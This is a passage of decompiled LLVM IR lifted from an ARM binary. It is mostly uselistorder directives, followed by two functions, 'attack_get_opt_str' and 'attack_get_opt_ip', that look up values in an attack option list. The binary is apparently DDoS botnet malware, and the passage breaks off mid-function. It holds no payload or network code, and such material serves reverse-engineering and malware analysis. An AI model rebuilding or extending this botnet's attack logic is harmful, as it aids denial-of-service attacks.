  uselistorder i32 %v0_9c6c, { 2, 1, 0, 3 }
  uselistorder i32 %v0_9bcc, { 1, 0 }
  uselistorder i32 %v2_9ba8, { 1, 0, 2 }
  uselistorder i32 %v1_9ba0, { 1, 0, 2 }
  uselistorder i32 %v1_9b28, { 0, 2, 1 }
  uselistorder i32 %v0_9b28, { 0, 2, 1 }
  uselistorder i32 %v2_9a9c, { 1, 2, 0, 5, 4, 3, 6 }
  uselistorder i8 %v4_9a74, { 2, 3, 1, 0 }
  uselistorder i32 %v1_9a68, { 1, 0, 3, 4, 2 }
  uselistorder i1 %v7_9a60, { 1, 0 }
  uselistorder i32 %v1_9a50, { 1, 0, 2 }
  uselistorder i1 %v7_9a4c, { 1, 0 }
  uselistorder i32 %v0_9a0c, { 2, 0, 1, 3 }
  uselistorder i32 %v3_99d0, { 2, 0, 1, 3 }
  uselistorder i32 %v2_99b4, { 1, 0, 2 }
  uselistorder i32 %v4_99ac, { 2, 1, 0, 3 }
  uselistorder i32 %v0_98d4, { 1, 0 }
  uselistorder i32 %v0_9898, { 1, 0 }
  uselistorder i32 %v0_9d74, { 1, 0 }
  uselistorder i1 %v7_9854, { 1, 0 }
  uselistorder i32 %v0_983c, { 1, 0 }
  uselistorder i32 %v2_982c, { 1, 0, 2 }
  uselistorder i32 %v1_97f8, { 1, 0 }
  uselistorder i32 %v0_97f8, { 1, 2, 0, 3 }
  uselistorder i1 %v7_9790, { 1, 0 }
  uselistorder i32 %v5_978c, { 1, 3, 6, 4, 5, 2, 0, 7, 8 }
  uselistorder i32 %v2_9774.v4_975c, { 1, 0, 2 }
  uselistorder i1 %v7_9738, { 1, 0 }
  uselistorder i32 %v1_9618, { 1, 0, 2 }
  uselistorder i32 %v1_9610, { 1, 0 }
  uselistorder i1 %v7_95f8, { 1, 0 }
  uselistorder i32 %v5_95f4, { 1, 2, 5, 3, 4, 0, 6, 7 }
  uselistorder i32 %v2_95dc.v4_95c4, { 1, 0, 2 }
  uselistorder i1 %v7_95a4, { 1, 0 }
  uselistorder i32 %v0_950c, { 1, 0 }
  uselistorder i32 %v0_94f4, { 1, 0 }
  uselistorder i32 %v0_94f8, { 1, 0 }
  uselistorder i32 %v1_94d0, { 2, 3, 1, 0, 4, 5, 6 }
  uselistorder i32 %v0_949c, { 1, 0 }
  uselistorder i1 %v7_9464, { 0, 2, 1 }
  uselistorder i32 %v1_9488, { 1, 0 }
  uselistorder i32 %v2_9478, { 0, 2, 1, 3 }
  uselistorder i32 %v0_9474, { 1, 0 }
  uselistorder i1 %v7_93e8, { 1, 0 }
  uselistorder i32 %v5_93e4, { 1, 5, 3, 4, 2, 0, 6, 7 }
  uselistorder i32 %v2_93cc, { 1, 0, 2 }
  uselistorder i32 %v2_93c8, { 1, 0, 2 }
  uselistorder i32 %v1_93b4, { 0, 2, 1 }
  uselistorder i32 %v4_93ac, { 1, 2, 0, 3 }
  uselistorder i1 %v7_937c, { 1, 0 }
  uselistorder i1 %v7_9314, { 1, 0 }
  uselistorder i32 %v5_9310, { 1, 2, 5, 3, 4, 0, 6, 7 }
  uselistorder i32 %v2_92f8.v4_92e0, { 1, 0, 2 }
  uselistorder i1 %v7_92b0, { 1, 0 }
  uselistorder i1 %v7_923c, { 1, 0 }
  uselistorder i32 %v5_9238, { 1, 2, 5, 3, 4, 0, 6, 7 }
  uselistorder i32 %v2_9220.v4_9208, { 1, 0, 2 }
  uselistorder i1 %v7_91e4, { 1, 0 }
  uselistorder i1 %v7_9164, { 1, 0 }
  uselistorder i32 %v5_9160, { 1, 2, 5, 3, 4, 0, 6, 7 }
  uselistorder i32 %v2_9148.v4_9130, { 1, 0, 2 }
  uselistorder i1 %v7_9110, { 1, 0 }
  uselistorder i1 %v7_90e4, { 1, 0 }
  uselistorder i1 %v7_90bc, { 1, 0 }
  uselistorder i32 %v0_9078, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v4_9048, { 2, 1, 0, 3, 4, 5 }
  uselistorder i32 %v2_8fe0, { 1, 0 }
  uselistorder i32 %v2_8fd4, { 1, 0 }
  uselistorder i32 %v1_8fd4, { 2, 0, 1, 3 }
  uselistorder i32 %v1_8fc8, { 1, 0 }
  uselistorder i32 %v3_8fac, { 5, 2, 3, 6, 4, 1, 0, 7 }
  uselistorder i32 %v2_8f8c, { 1, 0 }
  uselistorder i32 %v2_8f80, { 1, 0 }
  uselistorder i32 %v1_8f80, { 2, 0, 1, 3 }
  uselistorder i32 %v1_8f74, { 1, 0 }
  uselistorder i32 %v3_8f58, { 5, 2, 3, 6, 4, 1, 0, 7 }
  uselistorder i1 %v7_8f14, { 1, 0 }
  uselistorder i32 %v5_8ef0, { 1, 2, 3, 0 }
  uselistorder i1 %v7_8ed8, { 1, 0 }
  uselistorder i32 %v3_8ebc, { 1, 0 }
  uselistorder i32 %v0_8e78, { 1, 0 }
  uselistorder i32 %v3_8e44, { 4, 5, 6, 3, 1, 2, 0 }
  uselistorder i32* %v2_8e44, { 1, 0 }
  uselistorder i32 %v0_8e44, { 1, 0 }
  uselistorder i32 %v3_8e2c, { 1, 0, 2 }
  uselistorder i32 %v0_8e20, { 1, 2, 0 }
  uselistorder i32 %storemerge50, { 1, 0 }
  uselistorder i1 %v7_8d9c, { 1, 0 }
  uselistorder i32 %v4_8d90, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_8d60, { 1, 0 }
  uselistorder i32 %v2_8d50, { 1, 0 }
  uselistorder i32 %v2_8d44, { 1, 0 }
  uselistorder i32 %v1_8d44, { 2, 0, 1, 3 }
  uselistorder i32 %v1_8d38, { 1, 0 }
  uselistorder i32 %v3_8d1c, { 5, 2, 3, 6, 4, 1, 0, 7 }
  uselistorder i32 %v3_8d00, { 0, 2, 1 }
  uselistorder i32 %v2_8cd8, { 1, 0 }
  uselistorder i32 %v1_8cd8, { 2, 0, 1, 3 }
  uselistorder i32 %v0_8cd8, { 2, 4, 0, 1, 3, 5 }
  uselistorder i32 %v1_8cc4, { 1, 0 }
  uselistorder i32 %v3_8ca4, { 1, 0, 2 }
  uselistorder i32 %v1_8c08, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_8aac, { 1, 0 }
  uselistorder i32 %v3_888c, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_8838, { 2, 1, 0, 3 }
  uselistorder i32 %v3_8834, { 1, 0 }
  uselistorder i32 %v3_8828, { 2, 0, 1 }
  uselistorder i1 %v7_8814, { 1, 0 }
  uselistorder i32 %v3_880c, { 3, 2, 1, 0, 4, 5 }
  uselistorder i1 %v7_87e4, { 1, 0 }
  uselistorder i1 %v7_87dc, { 1, 0 }
  uselistorder i32 %v3_87c0, { 1, 0 }
  uselistorder i32 %v1_87a0, { 0, 1, 3, 2 }
  uselistorder i32 %v0_87a0, { 0, 2, 1 }
  uselistorder i32 %v2_879c, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8788, { 1, 0, 2 }
  uselistorder i32 %v1_8748, { 1, 0 }
  uselistorder i32 %v2_8728, { 1, 0 }
  uselistorder i32 %v1_8728, { 2, 0, 1, 3 }
  uselistorder i32 %v1_871c, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v0_8728, { 4, 1, 2, 5, 3, 0 }
  uselistorder i32 %v3_870c, { 1, 0 }
  uselistorder i32 %v3_8700, { 1, 0, 2 }
  uselistorder i1 %v7_865c, { 1, 0 }
  uselistorder i32 %v3_8658, { 3, 2, 1, 0, 4, 5 }
  uselistorder i1 %v7_8634, { 1, 0 }
  uselistorder i32 %v4_860c, { 2, 1, 0 }
  uselistorder i8 %v3_860c, { 11, 12, 13, 14, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* %v2_860c, { 2, 0, 3, 1 }
  uselistorder i32 %v3_88b0, { 4, 2, 3, 1, 0, 5 }
  uselistorder i1 %v7_85d4, { 1, 0 }
  uselistorder i32 %v1_85d4, { 1, 0 }
  uselistorder i1 %v7_85cc, { 1, 0 }
  uselistorder i1 %v7_85c4, { 1, 0 }
  uselistorder i1 %v7_85bc, { 1, 0 }
  uselistorder i32 %v1_85bc, { 1, 0 }
  uselistorder i1 %v7_85b4, { 1, 0 }
  uselistorder i1 %v7_85ac, { 1, 0 }
  uselistorder i32 %v1_8590, { 1, 0, 2, 4, 3 }
  uselistorder i32 %v2_8530, { 3, 2, 0, 4, 1, 5, 6 }
  uselistorder i8* %v1_88f0, { 11, 10, 12, 8, 6, 7, 9, 0, 1, 2, 3, 4, 5, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder i32 %v2_8710, { 0, 15, 1, 2, 3, 16, 4, 17, 5, 18, 6, 19, 7, 20, 8, 21, 22, 9, 23, 10, 13, 11, 14, 12, 24 }
  uselistorder i32 %v1_9e84, { 1, 0, 2 }
  uselistorder i32 %stack_var_-20860.0.ph, { 58, 59, 57, 0, 61, 60, 1, 56, 55, 2, 64, 63, 3, 68, 67, 4, 66, 65, 5, 62, 6, 79, 78, 7, 77, 76, 8, 75, 74, 9, 73, 72, 10, 71, 11, 70, 69, 12, 54, 53, 13, 52, 51, 14, 50, 49, 15, 48, 47, 16, 46, 45, 17, 44, 43, 18, 42, 19, 41, 40, 20, 39, 38, 21, 37, 36, 22, 35, 34, 23, 33, 24, 32, 31, 25, 30, 29, 26, 27, 28 }
  uselistorder i32 %stack_var_-20864.0.ph, { 1, 0 }
  uselistorder i32 %v3_850c, { 1, 0 }
  uselistorder i32 %v0_850c, { 1, 0, 2 }
  uselistorder i32 %v2_84d8, { 1, 0, 2, 3 }
  uselistorder i32 %v3_84cc, { 1, 0, 2 }
  uselistorder i32 %v0_84c0, { 1, 0 }
  uselistorder i32 %v5_84b8, { 1, 0 }
  uselistorder i32 %v0_8484, { 1, 2, 0, 3 }
  uselistorder i32 %v0_840c, { 5, 4, 1, 0, 3, 2 }
  uselistorder i32 %v0_83e0, { 1, 0 }
  uselistorder i32 %v2_83b0, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_839c, { 4, 5, 19, 15, 16, 17, 2, 3, 18, 0, 1, 14, 10, 11, 12, 13, 20, 8, 9, 7, 6 }
  uselistorder i32 %v0_8390, { 0, 1, 3, 2 }
  uselistorder i1 %v2_8320, { 1, 0, 2 }
  uselistorder i32 %v2_8300, { 2, 0, 1, 3 }
  uselistorder i32* %v11_82f4, { 2, 0, 1, 3 }
  uselistorder i32 %v10_82f0, { 22, 21, 20, 12, 11, 18, 17, 16, 19, 15, 14, 33, 32, 31, 29, 28, 30, 27, 26, 13, 24, 23, 10, 9, 8, 25, 7, 39, 38, 37, 35, 36, 34, 44, 43, 42, 41, 40, 6, 5, 4, 3, 2, 1, 0, 45, 46 }
  uselistorder i32 %v2_82e8, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v2_82d8, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v2_82c8, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v0_82a0, { 1, 0, 2 }
  uselistorder i8* %tmp169, { 5, 6, 4, 7, 3, 8, 2, 9, 1, 10, 11, 12, 0 }
  uselistorder i32 %v2_827c, { 0, 29, 35, 36, 37, 38, 1, 32, 2, 3, 33, 34, 39, 17, 18, 4, 28, 5, 6, 30, 31, 40, 7, 26, 8, 27, 9, 41, 10, 11, 24, 25, 42, 12, 21, 13, 22, 23, 43, 14, 15, 19, 20, 44, 45, 46, 16, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56 }
  uselistorder i32 %v5_8274, { 1, 0 }
  uselistorder i32 %v6_81fc, { 3, 2, 4, 0, 8, 7, 6, 1, 5, 9 }
  uselistorder i8** %stack_var_-44, { 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 0, 8, 7, 6, 5, 4, 1, 3, 2 }
  uselistorder i32* %sb.global-to-local, { 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 11, 28, 29, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 30, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 7, 4, 5, 6, 8, 9, 10, 11, 0 }
  uselistorder i32* %r3.global-to-local, { 4, 5, 6, 7, 8, 9, 10, 11, 12, 3, 13, 14, 16, 15, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 93, 39, 40, 42, 43, 44, 46, 45, 47, 48, 49, 50, 51, 41, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 148, 149, 150, 151, 155, 156, 152, 153, 154, 157, 158, 159, 117, 118, 119, 120, 121, 122, 123, 125, 124, 2, 127, 128, 126, 1, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 0 }
  uselistorder i32* %r2.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 42, 41, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 117, 118, 120, 121, 119, 122, 123, 125, 124, 93, 94, 95, 96, 97, 98, 2, 99, 100, 1, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 7, 10, 8, 9, 11, 39, 26, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 59, 57, 58, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 74, 72, 73, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 159, 135, 160, 161, 162, 163, 164, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 1, 148, 149, 150, 151, 152, 153, 154, 155, 156, 158, 157, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 18, 15, 14, 16, 139, 19, 133, 222, 58, 29, 20, 22, 21, 23, 25, 24, 27, 26, 30, 28, 31, 33, 32, 34, 36, 35, 38, 37, 42, 39, 40, 41, 43, 44, 46, 45, 48, 47, 49, 50, 51, 53, 52, 54, 55, 56, 59, 57, 61, 60, 62, 64, 63, 65, 68, 66, 67, 70, 69, 74, 71, 72, 73, 75, 77, 76, 79, 78, 80, 82, 81, 84, 83, 85, 86, 88, 87, 89, 90, 92, 91, 94, 93, 96, 95, 97, 99, 98, 100, 101, 102, 104, 103, 106, 105, 107, 109, 108, 110, 112, 111, 114, 113, 115, 117, 116, 118, 121, 119, 120, 123, 122, 125, 124, 126, 128, 127, 129, 131, 130, 134, 132, 135, 137, 136, 140, 138, 142, 141, 144, 143, 146, 145, 149, 147, 148, 151, 150, 152, 154, 153, 155, 158, 156, 157, 160, 159, 162, 161, 163, 165, 164, 166, 168, 167, 169, 170, 171, 173, 172, 175, 174, 176, 178, 177, 179, 181, 180, 182, 183, 184, 186, 185, 188, 187, 189, 191, 190, 192, 194, 193, 195, 197, 196, 198, 199, 201, 200, 203, 202, 206, 204, 205, 209, 207, 208, 212, 210, 211, 213, 215, 214, 216, 218, 217, 220, 219, 221, 223, 224, 226, 225, 229, 227, 228, 231, 230, 232, 234, 233, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 338, 339, 341, 340, 342, 343, 344, 287, 289, 288, 291, 290, 294, 293, 292, 298, 295, 296, 297, 17, 301, 299, 300, 302, 303, 304, 305, 306, 307, 1, 309, 308, 310, 311, 313, 312, 314, 315, 316, 318, 317, 319, 320, 321, 323, 322, 325, 324, 327, 326, 329, 328, 331, 330, 332, 333, 334, 335, 336, 337, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 50, 51, 52, 53, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49 }
  uselistorder i32* %fp.global-to-local, { 0, 34, 1, 3, 2, 4, 5, 6, 7, 28, 27, 31, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 29, 30, 32, 33, 35, 36 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 57, 56, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 101, 94, 95, 96, 97, 98, 99, 100, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 140, 139, 141, 142, 147, 149, 148, 143, 144, 145, 146, 150, 151, 152, 153, 114, 115, 123, 124, 116, 117, 118, 119, 120, 121, 122, 125, 0, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28, 27, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 62, 63, 61, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 106, 100, 101, 102, 103, 104, 105, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 152, 153, 158, 160, 159, 154, 155, 156, 157, 161, 162, 163, 164, 165, 121, 122, 123, 131, 132, 124, 125, 126, 127, 128, 129, 130, 133, 0, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151 }
  uselistorder i8* inttoptr (i32 8 to i8*), { 0, 2, 1, 3 }
  uselistorder i8* inttoptr (i32 7 to i8*), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_1a7b4.60 to i32), { 1, 2, 0, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_1a7a4.56 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_1a79c.54 to i32), { 1, 2, 0, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_1a790.52 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 -20773, { 1, 0, 2, 4, 3, 8, 5, 6, 7 }
  uselistorder i32 ptrtoint (i32* @global_var_1a798.50 to i32), { 2, 4, 3, 5, 1, 6, 0, 7 }
  uselistorder i32 2116, { 1, 2, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1a770.38 to i32), { 0, 2, 1, 3 }
  uselistorder i32 -1452, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 0, 23, 24 }
  uselistorder i32 1452, { 1, 0 }
  uselistorder i32 789, { 2, 0, 1, 3 }
  uselistorder i32 1431, { 1, 2, 0, 3 }
  uselistorder i32 533, { 1, 0, 3, 2, 4 }
  uselistorder i32 3140, { 3, 1, 0, 2, 4, 5 }
  uselistorder i32 51, { 1, 3, 0, 4, 2, 5 }
  uselistorder i32 50, { 0, 2, 1, 3 }
  uselistorder i32 49, { 0, 2, 1, 3 }
  uselistorder i32 43, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_1a778.29 to i32), { 0, 2, 3, 1, 4 }
  uselistorder i32 %arg4, { 1, 0, 2, 3 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_9e44, { 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_9d08, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9ce8, { 2, 0, 1 }
  uselistorder label %.thread48, { 1, 0 }
  uselistorder label %dec_label_pc_9ab4, { 1, 0 }
  uselistorder label %.thread45, { 1, 0 }
  uselistorder label %dec_label_pc_9a88, { 2, 0, 1 }
  uselistorder label %.thread42, { 1, 0 }
  uselistorder label %dec_label_pc_99ec, { 2, 1, 0 }
  uselistorder label %dec_label_pc_9918, { 5, 0, 1, 6, 2, 3, 4 }
  uselistorder label %dec_label_pc_98cc, { 1, 0 }
  uselistorder label %dec_label_pc_98a4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9898, { 1, 0 }
  uselistorder label %.thread38, { 1, 0 }
  uselistorder label %bb204, { 1, 0 }
  uselistorder label %dec_label_pc_9654, { 6, 1, 2, 7, 3, 4, 0, 5 }
  uselistorder label %bb202, { 1, 0 }
  uselistorder label %dec_label_pc_9550, { 0, 2, 1 }
  uselistorder label %dec_label_pc_94a4, { 1, 0 }
  uselistorder label %dec_label_pc_949c, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_9474, { 1, 0 }
  uselistorder label %dec_label_pc_9438, { 1, 0 }
  uselistorder label %bb198, { 1, 0 }
  uselistorder label %bb196, { 1, 0 }
  uselistorder label %bb194, { 1, 0 }
  uselistorder label %dec_label_pc_934c, { 2, 1, 0 }
  uselistorder label %bb192, { 1, 0 }
  uselistorder label %.thread27, { 3, 0, 1, 2 }
  uselistorder label %bb189, { 1, 0 }
  uselistorder label %.thread26, { 3, 0, 1, 2 }
  uselistorder label %bb186, { 1, 0 }
  uselistorder label %.thread25, { 1, 0 }
  uselistorder label %.thread24, { 1, 0 }
  uselistorder label %dec_label_pc_9080, { 1, 0 }
  uselistorder label %dec_label_pc_8f38, { 1, 0 }
  uselistorder label %dec_label_pc_8e08, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8de0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8d74, { 1, 2, 0 }
  uselistorder label %bb181, { 1, 0 }
  uselistorder label %dec_label_pc_8c84, { 1, 0 }
  uselistorder label %dec_label_pc_8c6c, { 1, 0 }
  uselistorder label %dec_label_pc_8c30, { 1, 0 }
  uselistorder label %dec_label_pc_8bbc, { 1, 0 }
  uselistorder label %dec_label_pc_8b84, { 1, 0 }
  uselistorder label %dec_label_pc_88bc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_87ec, { 7, 8, 9, 10, 11, 1, 12, 13, 2, 14, 15, 3, 16, 0, 6, 4, 5 }
  uselistorder label %dec_label_pc_87b4, { 1, 0 }
  uselistorder label %dec_label_pc_85f4, { 5, 0, 1, 2, 6, 4, 3, 7 }
  uselistorder label %dec_label_pc_8570.dec_label_pc_8570_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_8548.dec_label_pc_8548_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_852c, { 3, 0, 2, 1, 4 }
  uselistorder label %dec_label_pc_852c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_84c0, { 1, 0 }
  uselistorder label %dec_label_pc_8444, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb175, { 1, 0 }
  uselistorder label %bb173, { 1, 0 }
  uselistorder label %dec_label_pc_82fc, { 1, 0 }
  uselistorder label %dec_label_pc_82b4, { 1, 3, 4, 0, 2 }
}

define i32 @attack_get_opt_str(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_9f60 = icmp eq i32 %arg1, 0
  br i1 %v2_9f60, label %dec_label_pc_9fa8, label %dec_label_pc_9f70

dec_label_pc_9f70:                                ; preds = %entry
  %v0_9f70 = load i32, i32* %r1.global-to-local, align 4
  %v1_9f70 = add i32 %v0_9f70, 4
  %v2_9f70 = inttoptr i32 %v1_9f70 to i8*
  %v3_9f70 = load i8, i8* %v2_9f70, align 1
  %v4_9f70 = zext i8 %v3_9f70 to i32
  %v9_9f74 = icmp eq i32 %v4_9f70, %arg3
  br i1 %v9_9f74, label %dec_label_pc_9fb4, label %dec_label_pc_9f98.preheader

dec_label_pc_9f98.preheader:                      ; preds = %dec_label_pc_9f70
  br label %dec_label_pc_9f98

dec_label_pc_9f88:                                ; preds = %dec_label_pc_9f98
  %v1_9f88 = add i32 %v0_9f90.in, 12
  %v2_9f88 = inttoptr i32 %v1_9f88 to i8*
  %v3_9f88 = load i8, i8* %v2_9f88, align 1
  %v4_9f88 = zext i8 %v3_9f88 to i32
  %v9_9f8c = icmp eq i32 %v4_9f88, %arg3
  br i1 %v9_9f8c, label %dec_label_pc_9fb4, label %dec_label_pc_9f98

dec_label_pc_9f98:                                ; preds = %dec_label_pc_9f98.preheader, %dec_label_pc_9f88
  %v0_9f90.in = phi i32 [ %v0_9f70, %dec_label_pc_9f98.preheader ], [ %v0_9f90, %dec_label_pc_9f88 ]
  %v0_9f98 = phi i32 [ 0, %dec_label_pc_9f98.preheader ], [ %v1_9f98, %dec_label_pc_9f88 ]
  %v0_9f90 = add i32 %v0_9f90.in, 8
  %v1_9f98 = add i32 %v0_9f98, 1
  %v9_9f9c = icmp eq i32 %v1_9f98, %arg1
  store i32 %v0_9f90, i32* %r1.global-to-local, align 4
  br i1 %v9_9f9c, label %dec_label_pc_9fa8, label %dec_label_pc_9f88

dec_label_pc_9fa8:                                ; preds = %dec_label_pc_9f98, %entry, %dec_label_pc_9fb4
  %v0_9fa8 = phi i32 [ %arg4, %entry ], [ %v2_9fb4, %dec_label_pc_9fb4 ], [ %arg4, %dec_label_pc_9f98 ]
  ret i32 %v0_9fa8

dec_label_pc_9fb4:                                ; preds = %dec_label_pc_9f88, %dec_label_pc_9f70
  %v0_9fb4 = phi i32 [ %v0_9f70, %dec_label_pc_9f70 ], [ %v0_9f90, %dec_label_pc_9f88 ]
  %v1_9fb4 = inttoptr i32 %v0_9fb4 to i32*
  %v2_9fb4 = load i32, i32* %v1_9fb4, align 4
  br label %dec_label_pc_9fa8

; uselistorder directives
  uselistorder i32 %v1_9f98, { 1, 0 }
  uselistorder i32 %v0_9f90, { 1, 0, 2 }
  uselistorder i32 %v0_9f90.in, { 1, 0 }
  uselistorder i32 %v0_9f70, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9fa8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9f98, { 1, 0 }
}

define i32 @attack_get_opt_ip(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v2_9fbc = icmp eq i32 %arg1, 0
  %v3_9fc0 = load i32, i32* @r4, align 4
  store i32 %v3_9fc0, i32* %stack_var_-8, align 4
  %v6_9fc0 = load i32, i32* @lr, align 4
  store i32 %arg4, i32* @r4, align 4
  br i1 %v2_9fbc, label %dec_label_pc_a004, label %dec_label_pc_9fcc

dec_label_pc_9fcc:                                ; preds = %entry
  %v0_9fcc = load i32, i32* %r1.global-to-local, align 4
  %v1_9fcc = add i32 %v0_9fcc, 4
  %v2_9fcc = inttoptr i32 %v1_9fcc to i8*
  %v3_9fcc = load i8, i8* %v2_9fcc, align 1
  %v4_9fcc = zext i8 %v3_9fcc to i32
  %v9_9fd0 = icmp eq i32 %v4_9fcc, %arg3
  br i1 %v9_9fd0, label %dec_label_pc_a010, label %dec_label_pc_9ff4.preheader

dec_label_pc_9ff4.preheader:                      ; preds = %dec_label_pc_9fcc
  br label %dec_label_pc_9ff4

